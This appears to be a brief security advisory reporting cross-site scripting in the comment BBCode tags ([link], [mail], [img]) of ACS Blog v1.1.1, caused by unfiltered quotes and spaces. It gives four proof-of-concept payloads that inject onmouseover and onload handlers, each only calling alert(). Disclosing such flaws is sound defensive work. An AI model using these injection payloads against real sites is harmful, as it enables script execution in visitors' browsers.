These vulnerabilities have been tested on the latest version of ACS Blog. (v1.1.1)

In the comments section of ACS Blog, it is possible to execute an XSS attack through the [link], [mail], and [img] tags, due to lack of filtering of single quotes and spaces inside the tags.

Examples/PoCs:

[link=http://www.google.com' onmouseover='alert("XSS vulnerability")' o=']Don't you wanna see where this link goes?[/link]

[mail=bugtraq@securityfocus.com' onmouseover='alert("XSS vulnerability")' o=']Mr. Wiggles[/mail]

[img]http://www.example.com/image.jpg' onload='alert("XSS vulnerability")' o='[/img]

[link=http://www.google.com target=_blank'
onmouseover=a=/Vulnerability/;alert(a.source) o=']Hooray[/link]
